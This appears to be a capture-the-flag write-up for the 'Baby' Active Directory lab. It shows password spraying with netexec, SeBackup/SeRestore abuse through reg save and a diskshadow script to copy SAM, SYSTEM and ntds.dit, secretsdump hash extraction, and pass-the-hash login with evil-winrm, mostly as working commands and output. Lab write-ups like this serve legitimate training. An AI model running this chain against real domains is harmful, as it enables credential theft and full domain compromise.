# Baby - Easy

![image.png](image.png)

Baby is an easy difficulty Active Directory. This tests the user’s LDAP enumeration & spraying credentials. For SYSTEM it exploits the **SeBackup** & **SeRestore** privileges in order to get the hash of the admin in Domain Controller.

## User

When spraying using `netexec` the **sAMAccountName** is passed on `-u ‘’` an example would be `netexec smb <IP address> -u 'Teresa.Bell' -p 'password'` . But, you will notice that there are some accounts missing there, from our previous query `ldapsearch -H ldap://10.10.65.169 -x -b "DC=baby,DC=vl" "user" | grep dn` we notice 2 accounts there without **sAMAccountName** it’s **”Caroline Robiinson & Ian Walker** we also need to include them since they’re users on this domain controller. So their **sAMAccountName** would be `Caroline.Robinson` , `Ian.Walker` . The same as the other users.

Get the **sAMAccountName** of all users including the two users with no **sAMAccountName** put them into a file and start spraying with netexec.

```bash
netexec smb 10.10.65.169 -u users -p  'BabyStart123!'
SMB         10.10.65.169    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)                                                                                                                                 
SMB         10.10.65.169    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

Under `Caroline.Robinson` user, it says to change the password, this means it’s working. We need to change the password using `smbpasswd` since `bloodyAD` can’t change the password if the account is under the **STATUS_PASSWORD_MUST_CHANGE**.

```bash

#BabyStart123!:P@ssw0rd123
```

## System

Let’s check the privilege of this user, usually when dealing with **Active Directory** we use Bloodhound and check for misconfigured privileges. But for this, it’s straight forward.

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We can see that **SeBackupPrivilege** and **SeRestorePrivilege** is enabled. We can use this privilege to backup and restore some files.

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> mkdir C:\Temp

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/4/2025   1:52 PM                Temp

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd C:\Temp
*Evil-WinRM* PS C:\Temp> reg save hklm\sam C:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system C:\Temp\system
The operation completed successfully.
```

We backup `sam` and `system` download it in your machine using the `download <filename>` in `evil-winrm`.

In your machine, use `secretsdump.py` to decode **sam** and **system**

```bash
secretsdump.py -sam sam -system system LOCAL
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
```

If we try to login with this hash of administrator, it will fail because this hash belongs to the local administrator’s hash. We need the hash of the domain controller itself so we need the `ntds.dit` file in order to login.

The following chain command is a **DiskShadow** (Windows Volume Shadow Copy Service — VSS) that creates a shadow copy of the C: volume and exposes it as a drive letter so you can read files from the snapshot.

```bash
# save this as script.txt
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX

# run diskshadow
diskshadow /s script.txt

# copy ntds to c
robocopy /b E:\Windows\ntds . ntds.dit
```

The `X` at the end is just an indicator for evil-winrm that it is the end of the command and should move on to the next command in the next line. Then run `diskshadow` to execute the script. The snapshot will be saved at `E:\Windows\ntds` so you need to copy it in your current directory using `robocopy`.

Then run `secretsdump.py` but this time with the ntds.dit (don’t forget to download ntds.dit to your machine). 

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

Then login as SYSTEM in `evil-winrm`

```bash
evil-winrm -i baby.vl -u 'administrator' -H '<REDACTED>'
```
